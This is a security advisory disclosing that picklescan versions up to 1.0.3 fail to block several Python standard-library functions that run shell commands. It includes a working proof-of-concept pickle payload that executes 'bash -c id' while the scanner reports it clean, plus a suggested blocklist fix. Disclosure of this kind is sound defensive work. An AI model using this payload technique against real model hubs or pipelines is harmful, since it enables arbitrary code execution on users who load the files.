# PickleScan has multiple stdlib modules with direct RCE not in blocklist

**GHSA**: GHSA-g38g-8gr9-h9xp | **CVE**: N/A | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-184, CWE-693

**Affected Packages**:
- **picklescan** (pip): < 1.0.4

## Description

## Summary

picklescan v1.0.3 (latest) does not block at least 7 Python standard library modules that provide direct arbitrary command execution or code evaluation. A malicious pickle file importing these modules is reported as having 0 issues (CLEAN scan). This enables remote code execution that bypasses picklescan entirely.

## Severity

**Critical** (CVSS 9.8) — Direct RCE with zero scanner detection. Affects all deployments relying on picklescan, including HuggingFace Hub.

## Affected Versions

- picklescan <= 1.0.3 (all versions including latest)

## Details

### Unblocked RCE Modules

| Module | Function | RCE Mechanism | picklescan Result |
|--------|----------|--------------|-------------------|
| `uuid` | `_get_command_stdout(cmd, *args)` | `subprocess.Popen((cmd,) + args)` | CLEAN |
| `_osx_support` | `_read_output(cmdstring)` | `os.system()` via temp file | CLEAN |
| `_osx_support` | `_find_build_tool(toolname)` | Command injection via `%s` | CLEAN |
| `_aix_support` | `_read_cmd_output(cmdstring)` | `os.system()` | CLEAN |
| `_pyrepl.pager` | `pipe_pager(text, cmd)` | `subprocess.Popen(cmd, shell=True)` | CLEAN |
| `_pyrepl.pager` | `tempfile_pager(text, cmd)` | `os.system(cmd + ...)` | CLEAN |
| `imaplib` | `IMAP4_stream(command)` | `subprocess.Popen(command, shell=True)` | CLEAN |
| `test.support.script_helper` | `assert_python_ok(*args)` | Spawns `python` subprocess | CLEAN |

All 8 functions are in Python's standard library and importable on all platforms.

### Scanner Output

```
$ picklescan -p uuid_rce.pkl
No issues found.

$ picklescan -p aix_rce.pkl
No issues found.

$ picklescan -p imaplib_rce.pkl
No issues found.
```

Meanwhile:
```
$ python3 -c "import pickle; pickle.loads(open('uuid_rce.pkl','rb').read())"
uid=501(user) gid=20(staff) groups=20(staff),501(access),12(everyone)
```

### Blocklist Analysis

picklescan v1.0.3's `_unsafe_globals` dict (scanner.py line 120-219) contains ~60 entries. None of the following modules appear:

- `uuid` — not blocked
- `_osx_support` — not blocked
- `_aix_support` — not blocked
- `_pyrepl` — not blocked
- `_pyrepl.pager` — not blocked (parent wildcard doesn't apply since `_pyrepl` isn't blocked)
- `imaplib` — not blocked
- `test` — not blocked
- `test.support` — not blocked
- `test.support.script_helper` — not blocked

### Proof of Concept

```python
import struct, io, pickle

def sbu(s):
    b = s.encode()
    return b"\x8c" + struct.pack("<B", len(b)) + b

# uuid._get_command_stdout — arbitrary command execution
payload = (
    b"\x80\x04\x95" + struct.pack("<Q", 55)
    + sbu("uuid") + sbu("_get_command_stdout") + b"\x93"
    + sbu("bash") + sbu("-c") + sbu("id")
    + b"\x87" + b"R"   # TUPLE3 + REDUCE
    + b"."              # STOP
)

# Scan: 0 issues
from picklescan.scanner import scan_pickle_bytes
result = scan_pickle_bytes(io.BytesIO(payload), "test.pkl")
assert result.issues_count == 0  # CLEAN

# Execute: runs `id` command
pickle.loads(payload)
```

### Tested Against

- picklescan v1.0.3 (commit b999763, Feb 15 2026) — latest release
- picklescan v0.0.21 — same result (modules never blocked in any version)

## Impact

Any system using picklescan for pickle safety validation is vulnerable. This includes:

- **HuggingFace Hub** — uses picklescan server-side to scan uploaded model files
- **ML pipelines** — any CI/CD or loading pipeline using picklescan
- **Model registries** — any registry relying on picklescan for safety checks

An attacker can upload a malicious model file to HuggingFace Hub that passes all picklescan checks and executes arbitrary code when loaded by a user.

## Suggested Fix

Add to `_unsafe_globals` in picklescan:
```python
"uuid": "*",
"_osx_support": "*",
"_aix_support": "*",
"_pyrepl": "*",
"imaplib": {"IMAP4_stream"},
"test": "*",
```

**Architectural recommendation:** The blocklist approach is fundamentally flawed — new RCE-capable stdlib functions can be discovered faster than they are blocked. Consider:
1. Switching to an allowlist (default-deny) for permitted globals
2. Treating ALL unknown globals as dangerous by default (currently marked "Suspicious" but not counted as issues)

## Resources

- picklescan source: `scanner.py` lines 120-219 (`_unsafe_globals`)
- Python source: `Lib/uuid.py`, `Lib/_osx_support.py`, `Lib/_aix_support.py`, `Lib/_pyrepl/pager.py`, `Lib/imaplib.py`
